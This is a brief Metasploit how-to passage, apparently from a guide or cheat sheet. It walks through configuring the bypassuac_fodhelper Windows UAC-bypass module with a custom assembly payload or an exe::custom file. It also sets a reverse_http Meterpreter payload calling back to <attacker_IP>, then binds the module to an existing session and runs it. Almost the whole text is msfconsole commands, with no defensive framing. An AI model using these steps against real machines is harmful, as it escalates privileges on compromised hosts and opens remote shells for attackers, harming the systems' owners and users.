You can deploy your own custom payload especially when it's written in assembly from scratch. 

```
msf exploit(windows/local/bypassuac_fodhelper) > set payload generic/custom

msf exploit(windows/local/bypassuac_fodhelper) > options

msf exploit(windows/local/bypassuac_fodhelper) > advanced

msf exploit(windows/local/bypassuac_fodhelper) > set payloadfile /path/to/payload.bin

msf exploit(windows/local/bypassuac_fodhelper) > set arch x64

msf exploit(windows/local/bypassuac_fodhelper) > set platform windows
```

You can deploy a custom payload by specifying the `exe::custom` option.

```
msf exploit(windows/local/bypassuac_fodhelper) > set payload windows/x64/meterpreter/reverse_http

msf exploit(windows/local/bypassuac_fodhelper) > options

msf exploit(windows/local/bypassuac_fodhelper) > advanced

msf exploit(windows/local/bypassuac_fodhelper) > set lhost <attacker_IP>

msf exploit(windows/local/bypassuac_fodhelper) > set lport <attacker_PORT>

msf exploit(windows/local/bypassuac_fodhelper) > set exe::custom /path/to/payload.exe
```

Then pass on the `session` ID and execute the module.

```
msf exploit(windows/local/bypassuac_fodhelper) > session <session_ID>

msf exploit(windows/local/bypassuac_fodhelper) > run
```
